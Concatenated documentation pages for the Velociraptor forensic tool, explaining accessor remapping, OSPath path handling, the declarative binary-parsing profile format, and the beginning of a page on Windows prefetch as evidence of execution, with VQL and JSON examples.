======
---
title: "Remapping Accessors"
description: |
    VQL queries interact with the world via a well defined sandbox. This page described how remapping can be used to virtualize VQL queries within Velociraptor using remapping rules.

date: 2024-04-11T23:25:17Z
draft: false
weight: 40
---

In the previous section we learned how the Velociraptor's path
handling allows for precise and correct path manipulations. The OSPath
abstraction allows VQL plugins and functions to open files in a
consistent way using different accessors. For example we have seen how
files can be read inside a `zip` file easily, while still using the
familiar `glob()` plugin.


For example the following query applies the `yara()` plugin to search
inside a zip file:

```vql
SELECT * FROM foreach(row={
   SELECT OSPath
   FROM glob(
     globs="**",
     root=pathspec(DelegatePath="F:/hello.zip"),
     accessor="zip")
}, query={
   SELECT * FROM yara(rules=YaraRules, accessor="zip", filename=OSPath)
})
```

Where the `glob()` plugin searches for files within the zip file
`hello.zip` and passes the OSPath into the `yara()` plugin.

One downside to this query is that an initial `OSPath` object needed
to be built to access the zip file itself. This means that we can not
generally use existing VQL artifacts or queries and just apply them in
a zip file, because they need to build the initial OSPath objects
themselves.

For example, the following query uses `yara()` to search files on the
filesystem:

```vql
SELECT * FROM foreach(row={
   SELECT OSPath
   FROM glob(globs="**", root="C:/", accessor="auto")
}, query={
   SELECT * FROM yara(rules=YaraRules, accessor="auto", filename=OSPath)
})
```

If we created an artifact with this query in it, then how can we use
the same existing artifact within a zip file instead of on the
filesystem?

Comparing the two queries above we can see they are very similar. The
only thing that is really different between them is the path and the
accessor used, the general VQL query is exactly the same.

## Remapping and VQL

Velociraptor's VQL engine is a powerful and efficient language
interpreter which allows running powerful queries. You can think of
the VQL engine as a sandbox interpreting the VQL queries. However,
there are really only two ways for VQL queries to interact with the
system:

1. Using accessors and OSPath objects allows VQL queries to access
   various filesystem like constructs (e.g. registry, zip files etc).
2. Using specific plugins and VQL functions allows queries to call
   APIs on the host.

![VQL queries run in a sandbox](vql_interactions.png)

The idea behind `remapping rules` is to provide a system for mapping
certain accessors into other accessor names so as to turn the generic
query above from using the `auto` accessor into automatically using the
`zip` accessor. This allows us to `virtualize` the VQL query to run in
a different context - for example a query designed to run on the live
filesystem can simply run on a dead disk image.

![Path Remapping in Velociraptor](remapping_paths.png)

Consider the remapping configuration illustrated above. In this
configuration, when a plugin uses the "auto" accessor with a path like
"/Dir1", the "zip" accessor is used instead with an OSPath of
`{DelegatePath="F:/hello.zip"}`. This happens transparently once the
mapping rule is set up!

In the notebook, remapping rules are installed using the `remap()`
plugin and apply to all queries following the remap rule.

Let's configure a small remapping rule example in a notebook:

```vql
LET _ <= remap(config='''
remappings:
- type: mount
  from:
      accessor: zip
      prefix: |
        {
            "DelegateAccessor": "auto",
            "DelegatePath": "F:/hello.zip",
            "Path": "/"
        }
  on:
      accessor: "auto"
      prefix: "/"
      path_type: "windows"
''')

SELECT OSPath FROM glob(globs="*", accessor="auto", root="/")
```

This rule defines a remapping on the `auto` accessor at the root
level. The `auto` accessor will treat paths as windows path type. When
a plugin attempts to open a file using the `auto` accessor, the
remapping engine will instead use the `zip` accessor, and create an
OSPath that is constructed by adding the `auto` path into the `zip`
path. So opening a file called `hello.txt` with the `auto` accessor
will actually produce

```json
accessor: zip
path: {
        "DelegateAccessor": "auto",
        "DelegatePath": "F:/hello.zip",
        "Path": "/hello.txt"
      }
```

### Dead disk analysis

This remapping is useful to virtualize a query and allow it to run in
a different environment than it was initially designed for. This
allows us to reuse artifacts in different contexts. For example, a
live artifact can be reused with a dead disk image.

Click this link to learn more about how to create remapping files for
[dead disk analysis]({{< ref "/blog/2022/2022-03-22-deaddisk/" >}})

---END OF FILE---

======
FILE: /content/docs/forensic/filesystem/paths/_index.md
======
---
title: "Velociraptor Paths"
description: |
    In DFIR we often talk about paths and filesystems. However, these are usually more complex than they appear.

date: 2024-04-11T23:25:17Z
draft: false
weight: 30
---

In DFIR we often talk about paths and filesystems. However, these are
usually more complex than they appear.

Path handling is fundamental to forensic analysis, as a large amount
of relevant information is still kept on disk within a
filesystem. Superficially, We are all familiar with how paths work - a
path is typically a string that we can provide to some OS API (for
example the Windows `CreateFile()` or Linux `open()` API) which
facilitates interacting with a file or a directory on the filesystem.

Unfortunately, the structure of this string is often not well defined
or consistent between operating systems! For example, on windows a
path has the following characteristics:

1. The path starts with a "drive letter" of the form `C:` or `D:`
2. Path directories are separated by a backslash `\`
3. There is no leading path separator (i.e. `C:\` does not start with `\`).
4. Directory names may not contain forward slashes, backslashes or wildcards.
5. Filenames are generally case insensitive.

For example `C:\Windows\System32\Notepad.exe`

On Linux things are a bit different:

1. Paths begin with the slash character (the root of the filesystem)
2. Path directories are separated by forward slash
3. Directory names may contain backslashes but these are **not** path
   separators! Filename may contain pretty much any character (except
   null and forward slash).

For example, a Linux path looks like `/usr/bin/ls`. However, since
Linux can have backslashes with filenames, the path
`/C:\Windows/System32` can actually refer to a single directory named
`C:\Windows` which is contained in the root of the filesystem!

It gets even more complicated on Windows, where a `device name` may
appear as the first element of the path. Here it refers to a physical
device, for example `\\.\C:\Windows` means the `Windows` directory
inside the filesystem on the device `\\.C:` - Yes the device can
contain backslashes which are also path separators **except** when
they refer to a device.

A registry path has other rules:

1. It starts with the hive name, e.g. `HKEY_LOCAL_MACHINE` or `HKLM`
2. Components are separated by backslashes
3. While key names are analogous to directories, registry keys are
   allowed to have forward slash characters.
4. While Value name are analogous to files, value name may also have
   backslashes!

For example the following registry path is valid
`HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\.NETFramework\` `Windows
Presentation
Foundation\Namespaces\http://schemas.microsoft.com/netfx/2009/xaml/presentation`
(with the last registry key being a URL) even though the registry key
contains forward slashes it is just one key component!

With all these confusing rules we need to develop an abstraction that
allows Velociraptor to handle all these cases correctly.

Correct path handling is extremely important for Velociraptor, without
it various subtle bugs are encountered where a path is emitted from
one plugin (e.g. `glob()`) but misinterpreted by other plugins
(e.g. `read_file()`) which fail to open the same file correctly. Since
this interpretation depends on various contextual information (like
which OS we are running on, or which accessor was used) we need a way
to incorporate this information in the path itself.

Therefore in Velociraptor we represent paths as an OSPath object - not
a simple string.

## The OSPath abstraction

In recent Velociraptor releases the `OSPath` abstraction was introduced to
handle paths in a consistent and resilient way:

1. Internally paths are always a list of components. For example, the
   windows path `C:\Windows\System32` is represented internally as the
   list of components `["C:", "Windows", "System32"]`

2. A Filesystem is treated as a tree, and the path is simply the list
   of components connecting each level in the tree.

3. An `OSPath` implements specific serialization and deserialization
   methods: When we need to pass an OSPath object to the OS API we
   need to serialize the abstract OSPath in a way that is appropriate
   to the OS. Otherwise we prefer to retain the OSPath as an abstract
   path as much as possible.

4. Each `OSPath` has a specific flavor - controlling for the way it is
   serialized to and from a string. For example a Windows OSPath will
   serialize the components using the Windows path rules.

For example, an OSPath with the following components `["C:",
"Windows", "System32"]` will serialize to string:

* A Windows `OSPath` will serialize to `C:\Windows\System32`
* A Linux `OSPath` will serialize to `/C:/Windows/System32`
* A Windows NTFS aware OSPath will serialize to
  `\\.\C:\Windows\System32` (i.e. device notation appropriate to the
  NTFS raw accessor).

Velociraptor always represents paths as OSPath objects. You can create
the OSPath object using the `pathspec()` function, or by providing a
string to VQL functions that require an OSPath, the relevant accessor
is used to parse that string into an OSPath object appropriate for
that accessor.

## The glob() plugin

One of the most commonly used plugins in Velociraptor is the `glob()`
plugin. This plugin allows searching of filesystems using a glob
expression (containing wildcards).

Consider the following query running on windows

```vql
SELECT OSPath
FROM glob(globs="*", root="C:\\Windows", accessor="auto")
```

The `glob()` plugin applies the glob expression on the filesystem and
returns a single row for each matching file. Looking at the [reference
for the glob()]({{< ref "/vql_reference/popular/glob/">}}) function, we
can see that the `root` parameter is of type OSPath.

Since in the above query, the accessor specified is the `auto`
accessor, VQL will call on that accessor to interpret the string to an
OSPath before passing it to the `glob()` function. On windows, the
`auto` accessor follows the Windows rules above (with `\\` being the
path separator) to produce an OSPath like this:

```
Components: ["C:", "Windows"]
PathType: "Windows"
```

Note that on Linux, the same path will be interpreted as:
```
Components: ["C:\\Windows"]
PathType: "Linux"
```

Since the `\\` is not a path separator on Linux!

The OSPath object has some convenient properties:

* The `Components` field contains the list of path components in the
  path. You can index the component to identify a specific directory
  or filename.  (negative indexes are counted from the end of the
  component array).

* The `Basename` property is a shorthand to the last component
  (equivalent to `OSPath.Components[-1]`)

* The `Dirname` property is an OSPath representing the directory
  containing the OSPath.

* Path manipulation is very easy to do, since OSPath is overloading
  the addition operator to make path manipulation simple and
  intuitive. **There is no need to split or join on path separators in
  most cases!**

While it may appear that the OSPath a simple string when serialized to
JSON, it is in fact an object with many convenient methods.

![The OSPath object](ospath.png)

The above example shows some common manipulation techniques:

1. The component list of the OSPath can be retrieved using
   `OSPath.Components`
2. The Basename (the last path element) can be retrieved using
   `OSPath.Basename` - this is a string.
3. The Directory name of a path is an OSPath with the last component
   removed `OSPath.Dirname`.
4. The addition operator on OSPath allows appending further path
   components: `OSPath + "a/b/c/filename"` is another OSPath with an
   extra component. The additional string will be split using the
   usual path separator.
5. Addition with a slice of strings will automatically append
   components to the path. For example this query will swap the drive
   name from `C:` too `D:` by first building an OSPath for `D:` drive
   then adding all the components (except the first one) from the
   glob's OSPath to it.

```vql
SELECT pathspec(Path="D:", path_type="windows") + OSPath[1:]
FROM glob(globs="C:/Windows/*")
```

## Filesystem accessors and OSPath

Velociraptor accesses filesystems by way of an `accessor`. You can think
of an accessor as a specific driver that VQL can use to open a
path. All VQL plugins or functions that accept files will also accept
an accessor to use to open the file.

Consider the following VQL query:

```vql
SELECT read_file(path="C:/Windows/notepad.exe", accessor="file")
FROM scope()
```

The `read_file()` VQL function reads raw data from the specified
file. The `path` argument is defined of type OSPath. Since we passed a
string here, VQL will need to convert it into an OSPath by calling
onto the "file" accessor and pass the provided path to it as an opaque
string.

The `file` accessor is used to open files using the OS
APIs. Therefore, it will interpret the path string according to the OS
convention it is running on (i.e. on Windows it will create a Windows
flavor of OSPath). However, were we to use another accessor, the
string path will be interpreted differently by the accessor.

{{% notice note "Interpreting paths" %}}

The most important takeaway from this is that when an accessor
receives a string path, it will parse it into an OSPath internally
according to its own rules. However, internally OSPath objects are
passed directly into the VQL query.

When a plugin receives an already parsed OSPath object, it may
directly use it (since no parsing is required). Therefore in general,
once an OSPath object is produced in the query, the same OSPath object
should be passed around to other plugins/vql functions.

```vql
SELECT read_file(filename=OSPath, accessor="file", length=5)
FROM glob(globs="C:\\Windows\\notepad.exe")
```

In the above the string `C:\Windows\notepad.exe` is parsed once into
an OSPath object, but then `glob()` passes an OSPath object already so
`read_file()` does not need to parse anything. This increases
efficiency in VQL because we avoid having to parse and serialized
paths all the time!

{{% /notice %}}


## Nested accessors and pathspecs

Many VQL accessors require additional information to be able to
work. For example consider the `zip` accessor. This accessor is used
to read zip archive members as if they were simple files. In order to
open an archive member we need several pieces of information:

1. The path to the zip file itself.
2. An accessor to use to open the zip file container.
3. The path to the zip member inside the container to open.

The `zip` accessor therefore requires a more complex OSPath object
containing additional information about the `Delegate` (i.e. the path
and accessor that the zip accessor will delegate the actual reading
to). An OSPath Delegate is another path and accessor used by an
accessor to be able to open the file it depends on.

We call this more complex path specification a `pathspec` as it
specifies more precisely what the accessor should do. In a VQL query
we may build a pathspec from scratch using the `pathspec` function.

```vql
SELECT read_file(
  filename=pathspec(DelegateAccessor="file",
                    DelegatePath="F:/hello.zip",
                    Path="hello.txt"),
  accessor="zip",
  length=5)
FROM scope()
```

In the above example I am calling the `read_file()` VQL function, and
building an OSPath object directly using the `pathspec()` VQL
function.

The `zip` accessor receives the new OSPath object and

1. Will open the zip container itself using the `Delegate`: i.e. the
   "file" accessor, with a path of "F:/hello.zip".
2. After parsing the zip file, the `zip` accessor will open the member
   within it specified by the `Path` field. For zip files, the path is
   interpreted as a forward slash separated unix like path (according
   to the zip specification). In this case the zip accessor will open
   a member called `hello.txt` within that Zip file.
3. Finally the `read_file()` function will read that member file and
   receive the content of the `hello.txt` archive member.

Note that in practice we rarely need to build the OSPath directly like
in the example above, because the OSPath object is passed already from
another plugin (e.g. `glob()`)

## Nesting OSPath objects.

We can combine the previous two queries to search zip files

```vql
SELECT OSPath,
   read_file(filename=OSPath, accessor="zip", length=5)
FROM glob(
  globs="*.txt",
  root=pathspec(DelegateAccessor="auto", DelegatePath="F:/hello.zip", Path="/"),
  accessor="zip")
```

This time we provide the `glob()` plugin the root (where searching
will begin) as a full OSPath object that we construct to represent the
top level of the zip archive (i.e. globing will proceed within the zip
file).

In practice `Path="/"` can be omitted since this is the default
value. Similarly, `DelegateAccessor="auto"` can also be omitted since
this is the default accessor, thus simplifying the above query.

We can transparently now pass the OSPath object that glob will return
directly into any VQL function or plugin that accepts a file
(e.g. `read_file()`)

![Handling nested OSPath objects](nested_pathspec.png)

The OSPath object is now capable of more complex path manipulations:

1. The `OSPath.Dirname` property represents the fully qualified OSPath
   used to represent the container directory - we can simply pass it
   directly to any plugins that deal with directories.

2. Note that more complex `Pathspec` based paths are represented as a
   JSON encoded object. It is ok to pass the stringified version of
   OSPath to plugins because they will automatically parse the
   string into an OSPath object.

{{% notice info "Glob's root parameter" %}}

When using the `glob()` plugin, remember that Glob expressions are
always flat strings (i.e. a glob is not a pathspec). An OSPath should
be passed to the `root` parameter to indicate where searching should
start from. This allows `glob()` to search inside nested containers
(e.g. zip files) by specifying the `root` parameter inside the zip
file like in the example above.

{{% /notice %}}

## Summary

Path representation is surprisingly much more complex that it first
appears. While paths are strings, internally Velociraptor treats them
as a sequence of components with different flavors controlling how
they are serialized and represented. This affords the VQL query a more
powerful way to manipulate paths and build new paths based on them.

For more complex accessors, paths are represented as a JSON serialized
`OSPath` object, describing a delegate path as well. Using the
`OSPath` object methods does the right thing even for more complex
path and makes it a lot easier to manipulate (for example
`OSPath.Dirname` is a valid and correct `OSPath` for the containing
directory, even for more complex pathspec based paths)

Velociraptor's path handling abstraction is clear and simple and has
consistent rules. We will see how this enables Velociraptor's
remapping rules in the next section.

---END OF FILE---

======
FILE: /content/docs/forensic/binary/_index.md
======
---
title: "Binary parsing"
weight: 50
---

Parsing binary is a very important capability for forensic analysis and
DFIR - we encounter binary data in many contexts, such as file
formats, network traffic and more.

Velociraptor uses VQL to provide the flexibility for users to be able
to craft a VQL query in order to retrieve valuable machine state
data. Sometimes we need to parse binary data to answer these
questions.

While binary parsers written in Golang are typically the best options
for speed and memory efficiency, the need to compile a parser into an
executable and push it to the endpoint makes it difficult to implement
adhoc parsers. Ideally we would like to have a parser fully
implemented in VQL, so it can be added to an artifact and pushed to
the endpoint without needing to recompile and rebuild anything.

## Why parse binary data?

The term `serialization` refers to the process of converting data into
a suitable form for storage or transmission. During runtime, a program
represents data with an abstract type - for example integer, float,
string etc.

When the program needs to transfer the data, either to storage or over
the network, data needs to be `serialized`, i.e. converted into binary
form. When reading the data, the reverse process occurs and binary
data is interpreted (or `unserialized`) to recover the original
abstract types.

Ultimately there is a correspondence between the binary data and the
abstract object stored in it. The most important thing to understand
about serialization is that there is no single way to interpret
binary data into meaningful information - each type has its own
interpretation and serialization method. The same binary data may be
interpreted in different ways and produce valid types!

Consider a `uint64` type. When serialized, the value is packed into 8
binary bytes in little endian order. Those same 8 bytes may be
interpreted as a string, 2 `uint32` integers or any number of
different types - there is nothing inherently special about the 8
bytes of binary data that indicate what they mean.

Ultimately, parsing binary data is about extracting semantic meaning
from the binary data - this encodes interpretation and understanding
of what the serialized data means. Not all fields need to be
understood to be able to extract useful meaning from the data -
partial parsing is still very valuable.

### What is a binary parser?

At a high level a binary parser is a tool we use to extract meaning
from binary data. The parser encodes semantic information about what
each byte in the binary sequence means. It really emulates the
software that usually reads the data by constructing something similar
to the original (often closed source code) meaning. Sometimes not all
the information is known or can be interpreted - so parsers can be
incomplete.

Parsers typically fall into two general types: `Procedural` and
`Declerative`.

A procedural parser is written as a sequence of actions (i.e. code)
that pulls information from the binary data and reports some semantic
information about that data. On the other hand, a declarative parser
seeks to explain the meaning behind each field and decode it based on
the type of the field.

An example might illustrate the difference between the two
approaches. Suppose a program encodes a sequence of flags in an 8 bit
integer - one flag per bit. A procedural parser might be coded as:

```
value = parse_uint8(data, offset=0)
if value & 0x1:
   print "Flag 1"
if value & 0x2:
   print "Flag 2"
if value & 0x4:
   print "Flag 3"

etc...
```

The parser consists of a sequence of steps that report the flag values
by calculating which bit is set.

On the other hand, a declarative parser aims to convey the meaning
behind the data. Since storing flags in a bitmap is such a common
serialization primitive, a declarative parser will just declare:

```yaml
name: "FlagField"
offset:0
type:"uint8"
choices:
   Flag 1: bit 0
   Flag 2: bit 1
   Flag 3: bit 2
...
```

{{% notice note "The C language" %}}

Although the original program may or may not be written in C, we often
refer to concepts as implemented in the C language simply because it
was implemented first. Many of the common serialization primitive are
also declarative in C - for example flags can be declared as
[bitfields](https://en.cppreference.com/w/cpp/language/bit_field):

```c
struct FlagField {
  uint8 Flag1: 1;
  uint8 Flag2: 1;
  uint8 Flag3: 1;
}
```
{{% /notice %}}

The Velociraptor binary parser is **declarative** - it consists of
high level declarations of how the data is to be laid out in the
binary blob, rather than code to extract the data. This is an
important distinction - quite often when reading other parsers written
in the procedural style you will need to understand what the field
actually represents before you can implement the parser in
Velociraptor!

## Parsing structs

In the C language a collection of related fields is called a `struct`
(While other languages may refer to this using a different name we
will refer to it using `struct`). A struct typically contains specific
named fields with each field having a specific meaning and type.

Structs are usually serialized by serializing each field one after the
other as binary data. Typically each field ends up at a specific
offset from the start of the struct.

The binary parser is driven by a json data structure called a
"Profile". A Profile is simply a data driven description of how
structs are laid out and how to parse them.

In order to use the parser, one simply provides a profile definition,
and a file (or data blob) to parse. The parser is given an offset and a
struct to instantiate. Here is an example of VQL that parses a single
`Header` struct from the start of the file. The struct has 2 members,
the `Signature` is a string of length 10 bytes starting from offset 0,
and the `Length` is a 4 byte little endian integer located at offset
20.

```vql
LET Profile = '''
[
   ["Header", 0, [
      ["Signature", 0, "String", {
         "length": 10
      }],
      ["Length", 20, "uint32"],
   ]],
]
'''

SELECT parse_binary(
   profile=Profile,
   filename='/path/to/file', struct='Header')
FROM scope()
```

## Profile description.

Profile descriptions are supposed to be easy to understand and quick
to write. It is a way of describing how to parse a particular binary
type at a high level.

A profile is a list of struct definitions. Each struct definition
contains the name of the struct, its size and a list of field
definitions.

In turn field definitions are a list of the field's name, its offset
(relative to the start of the struct), and its type followed by any
options for that type.

Typically a profile is given as JSON serialized string.

![Structure of profile definition](profile.png)

Here is an example of a profile with two structs:

```json
[
  ["Header", 0, [
    ["Signature", 0, "String", {
       "length": 13
    }],
    ["CountOfEntries", 14, "uint32"],
    ["Entries", 18, "Array", {
        "type": "Entry",
        "count": "x=>x.CountOfEntries"
    }]
  ]],
  ["Entry", "x=>x.ModuleLength + 20", [
    ["Offset", 0, "Value", {"value": "x=>x.StartOf"}],
    ["ModuleLength", 8, "uint32"],
  ]],
]
```

In the above example:

1. There are two struct definitions - for one called `Header` and one
   called `Entry`.

2. The size of the header is not specified (it is 0). The size of a
   struct becomes important when using the struct in an array.

3. The `CountOfEntries` field starts at offset 14 into the struct and it
   is a `uint32`.

4. The `Entries` field starts at offset 18, and contains an array. An
   array is a collection of other items, and so it must be initialized
   with the proper options. In this case the array contains items of
   type "Entry".

5. The count of the array is the number of items in the array. Here it
   is specified as a lambda function.

### Lambda functions

Lambda functions are VQL snippets that calculate the value of various
fields at runtime. The Lambda is passed the struct object currently
being parsed, and so can simply express values dependent on the
struct's fields.

In the above example, the count of the array is given as the value of
the field CountOfEntries. This type of construct is very common in
binary structures (where a count or length is specified by another
field in the struct).

The definition of the Entry struct is given above. The size is also
given by a lambda function, this time, the size of the entries is
derived from the ModuleLength field. Note how in the above definition,
the Entries field is a list of variable sized Entry structs.

Note that a lambda function is just VQL and has access to any VQL
functions or plugins available in the scope. Within an artifact lambda
functions also have access to any artifact parameters.

{{% notice note "Binary parsing is lazy!" %}}

Since the binary parser is declarative, a lambda function simply
declares that the value of the entity will be calculated based on this
formula - lambda function are only evaluated when needed in a lazy
fashion.

There is no problem in declaring fields that are never used - they
present no additional cost on parsing. In fact it is preferred that a
parser be as complete as possible, even if fields are not currently
used.

{{% /notice %}}

## Field types

Struct fields are parsed out using typed parsers. The name of the
parser is used at the 3rd entry to its definition. Some field types
receive a JSON object as key/value options.

The below document all the parsers currently implemented and relevant
options.

### Primitive parsers

These parse primitive types such as int64, uint32. They take no
options.

| Little Endian (Aliases in brackets)  | Big Endian |
|--------------------------------------|------------|
| uint8 (byte, unsigned char)          | uint8b     |
| uint16 (unsigned short)              | uint16b    |
| uint32 (unsigned int, unsigned long) | uint32b    |
| uint64 (unsigned long long)          | uint64b    |
| int8 (char)                          | int8b      |
| int16 (short int)                    | int16b     |
| int32 (int)                          | int32b     |
| int64                                | int64b     |
| float64                              | float64b   |


### Struct

Using the name of a struct definition will cause a StructObject to be
produced. These look a bit like dict objects in that VQL can simply
dereference fields, but fields are parsed lazily (i.e. upon access
only).

A struct object has the following additional attributes:

1. `SizeOf` property is the size of the struct (which may be derived
   from a lambda). For example, `x=>x.SizeOf` returns the size of the
   current struct.

2. `StartOf` and `EndOf` properties are the offset to the start and
   end of the struct.

Struct objects are defined especially in the profile and do not take
any options.

### Array

An array is a repeated collection of other types. Therefore the array
parser must be initialized with options that specify what the
underlying type is, its count etc.

| Option       | Description                                                                                                                      |
|--------------|----------------------------------------------------------------------------------------------------------------------------------|
| type         | The type of the underlying object                                                                                                |
| type_options | A dict of options to pass to the type parser if needed                                                                           |
| count        | How many items to include in the array (can be lambda)                                                                           |
| max_count    | A hard limit on count (default 1000)                                                                                             |
| sentinel     | If specified a value representing the end of the array. Can be a lambda in which case returning TRUE means the end of the array. |

Parsing a field as an array produces an ArrayObject which has the
following properties:

1. `Size`, `Start`, `End` properties represent the size of the
   array in bytes, the start and end offset of the array.
2. `Contents` property accesses the underlying array.

You can iterate over an ArrayObject with the `foreach()` plugin:

```vql
SELECT * FROM foreach(row=Header.Entries, query={
  SELECT _value FROM scope()
})
```

An example of a use of Array can be found in the Linux `wtmp` parser:

```json
["Header", 0, [
  ["records", 0, "Array", {
      "type": "utmp",
      "count": "x=>MaxCount",
      "max_count": "x=>MaxCount"
  }]
]],
```

{{% notice tip "Specifying the size of array members" %}}

Normally the size of a struct can be specified as 0, however when
using the struct in an Array, the size must be valid and non
zero. This is because Array uses the size of the target type to
determine how far apart each array member lies in the data.

You can also use a lambda to specify the size of the item - this
allows you to use Array to specify non uniform arrays (where each
member has a different size).

For example the following specifies a header containing a count of
entries stored back to back, while each entry has a size specified in
its first member.

```json
["Header", 0, [
  ["count", 0, "uint32"],
  ["records", 4, "Array", {
      "type": "Entry",
      "count": "x=>x.count",
  }]
]],
["Entry", "x=>x.Length", [
  ["Length", 0, "uint32"],
]],
```

{{% /notice %}}

### String

Strings are very common items to parse. The string parser can be
configured using the following options.

| Option     | Description                                                                                                                                                             |
|------------|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| encoding   | Can be UTF16 to parse utf16 arrays                                                                                                                                      |
| term       | A terminator - by default this is the null character but you   can specify the empty string for no terminator or another sequence   of characters.                      |
| term_hex   | A terminator specified as a hex string (e.g. 01020304)                                                                                                                  |
| term_exp   | A terminator specified as a lambda                                                                                                                                      |
| length     | The length of the string - if not specified we   use the terminator to find the end of the string. This can also be   a lambda to derive the length from another field. |
| max_length | Max length of the string to parse                                                                                                                                       |


{{% notice tip "String as a way to search for patterns" %}}

You can use the String field as a way to search for a pattern in
binary data - simply specify the pattern as a termination sequence and
use the length of the string as an offset.

For example the below parses an `EntryStruct` at the location of the
first pattern of 01020304 from the start of the Header struct:

```json
[
 ["Header", 0, [
   ["__patternBlock", 0, "String", {
     term_hex: "01020304",
   }],
   ["Entry", "x=>len(x.__patternBlock)", "EntryStruct"],
 ]],
]
```
{{% /notice %}}


### Value

Sometimes we need to calculate the value of the field based on an
arbitrary other fields. For this we can use the `Value` field
type. This field type takes the following options:

| Option | Description |
|--------|--------------------------------------------------------------------------------------------|
| value  | A fixed value or a lambda expression that will be used to calculate the value of the field |

Note that the offset part of the field definition is meaningless for
value fields so it is ignored.

{{% notice tip "Using value as a debugging tool" %}}

You can use Value fields for debugging - just use a `log()` or
`format()` statement in the lambda to log other fields in the struct.

```json
['Debug', 0, 'Value', {
   "value": "x=>format(format='Field %v SizeOf %v', args=[x.Field, x.SizeOf])",
}],
```

{{% /notice %}}

### Enumeration

An enumeration is a set of values mapped to names with some
meaning. For example, an application might store a value as the
integer 2, representing "Error", and integer 0 representing "Success".

When the parser encounters a 2, we want it to show "Error".

| Option  | Description                                                                                                                 |
|---------|-----------------------------------------------------------------------------------------------------------------------------|
| type    | The type of the underlying object (usually an integer)                                                                      |
| choices | A mapping between the integer value and the string it represents.                                                           |
| map     | A mapping between the string value and int - this is an alternative to choices and essentially is formatted as the reverse. |


Note that due to the limitations of JSON, even though the keys in the
choices dictionary are really ints they need to be encoded as
strings. That is why there is a `map` parameter that has names mapped
to ints because it looks a bit more natural with JSON.


Example:

```json
  ["NetworkProviderType", 16, "Enumeration", {
      "type": "uint32",
      "map": {
          "WNNC_NET_AVID": 0x001A0000,
          "WNNC_NET_DOCUSPACE": 0x001B0000,
          "WNNC_NET_MANGOSOFT": 0x001C0000,
      }
  }]
```

### BitField

A bitfield is a type that packs an integer into bits of an underlying
integer type. For example, a 64 bit integer may be broken into several
BitFields: Field1 of 5 bits , Field2 of 3 bits and Field3 of 8 bits.

This example might look like (notice all BitFields share the same
struct offset)

```json
["Field1", 12, "BitField", {
    type: "uint64",
    start_bit: 0,
    end_bit: 5,
}],
["Field2", 12, "BitField", {
    type: "uint64",
    start_bit: 5,
    end_bit: 8,
}],
["Field3", 12, "BitField", {
    type: "uint64",
    start_bit: 8,
    end_bit: 16,
}]
```

### Flags

A common pattern is storing a series of flags (boolean values) in
specific bits of an integer. The difference between the Flags object
and the Enumeration object is that an enumeration represents a single
string value, while Flag may set multiple values at the same time.

| Option  | Description                                                                                                                 |
|---------|-----------------------------------------------------------------------------------------------------------------------------|
| type    | The type of the underlying object (usually an integer)                                                                      |
|bitmap | A mapping between bit number and the name of the flag |

Example:

```json
["FlagsField", 12, "Flags", {
   type: "uint8",
   bitmap: {
    "0": "Flag1",
    "1": "Flag2",
    "2": "Flag3",
    "3": "Flag4",
   }
}],
```

{{% notice warning "Flags uses bit positions" %}}

When looking at procedural parsers (or header files), quite often
flags will be presented as a MASK. For example above you might see
something like:

```
#define FLAG1_MASK 0x01
#define FLAG2_MASK 0x02
#define FLAG3_MASK 0x04
#define FLAG4_MASK 0x08
```

Remember that the bitmap above uses bit number instead, so e.g. a mask
of 0x08 represents bit 3.

{{% /notice %}}


### WinFileTime, FatTimestamp and Timestamp

Often fields represent time as a 64 bit integer. Use the WinFileTime
and Timestamp field types to convert these fields to a `time.Time`
object.

This is a convenience type because you can always use VQL lambdas with
Value fields for better timestamp handling.


The following options are accepted (if they are not provided we use a
uint32 as the underlying type with a factor of 1).

| Option  | Description                                                                                                                 |
|---------|-----------------------------------------------------------------------------------------------------------------------------|
| type    | The type of the underlying object (usually an integer)                                                                      |
|factor | A factor that will divide the underlying type before conversion |

### Union

A union is a field which can contain one of multiple types at the same
offset. The interpretation of the field depends on some condition
(often a different field in the same struct).

The following options are required:

| Option   | Description                                                                                                        |
|----------|--------------------------------------------------------------------------------------------------------------------|
| selector | A lambda function that will be evaluated. It is expected to return a string which will be the key into the choices |
| choices  | A mapping between a value returned by the selector and type that will be used to interpret the field.              |

Union types are often used when binary data can contain different
struct types. There will usually be a way to determine which type is
actually stored at that offset.

In the following example, the `Entry` struct consists of the first
byte being an enumeration. If the value is 1, the payload will be of
type Struct1, while if the value of the first byte is 2 the payload is
of type Struct2.

The Payload field will be interpreted based on the PayloadType:

```json
[
  ["Entry", 0, [
    ["PayloadType", 0, "Enumeration", {
       type: "uint8",
       map: {
          "Struct1": 1,
          "Struct2": 2,
       }
    }],
    ["Payload", 2, "Union", {
       selector: "x=>x.PayloadType",
       choices: {
         "Struct1": "Struct1",
         "Struct2": "Struct2",
       }
    }],
  ]],
  ["Struct1", 0, [

  ]],
  ["Struct2", 0, [

  ]],
]
```

### Profile

Sometimes a struct represents a pointer to another offset in a more
complex way. The `Profile` field type allows us to take full control
over how the field is to be instantiated.


| Option  | Description                                                                                                                 |
|---------|-----------------------------------------------------------------------------------------------------------------------------|
| type    | The type of the underlying object (usually an integer)                                                                      |
| type_options | A dict of options to pass to the type parser if needed                                                                           |
| offset | a lambda function to specify the offset |

For example the following definition specifies that when the `Value`
field is accessed it will be created from an `ASFinderInfo` struct
positioned at a calculated offset of `x.Offset + 48` (from the start
of the file).

```json
["Entry", 12, [
  ["ID", 0, "uint32b"],
  ["Offset", 4, "uint32b"],
  ["Length", 8, "uint32b"],
  ["Value", 0, "Profile", {
       type: "ASFinderInfo",
       offset: "x=>x.Offset + 48",
  }]
]],
```

---END OF FILE---

======
FILE: /content/docs/forensic/evidence_of_execution/_index.md
======
---
title: "Evidence Of Execution"
date: 2021-06-27T04:12:21Z
draft: false
weight: 60
---

Sometimes we need to find out when (or if) a particular binary was run
on the endpoint. This question can come up in a number of contexts,
such as running malware by a user, lateral movement from a threat
actor etc.

Windows has a rich set of forensic artifacts that we can use to infer
program execution. This page covers some of the more common evidence
of execution artifacts.

## Prefetch files

Prefetch files are used to [keep track of executions](http://web.archive.org/web/20130315214654/http://windows.microsoft.com:80/en-US/windows7/What-is-the-prefetch-folder)

> What is the prefetch folder?
>
> Each time you turn on your computer,
> Windows keeps track of the way your computer starts and which
> programs you commonly open. Windows saves this information as a
> number of small files in the prefetch folder. The next time you turn
> on your computer, Windows refers to these files to help speed the
> start process.

You can see those prefetch files in the `C:\Windows\prefetch` directory

![Prefetch files](image4.png)

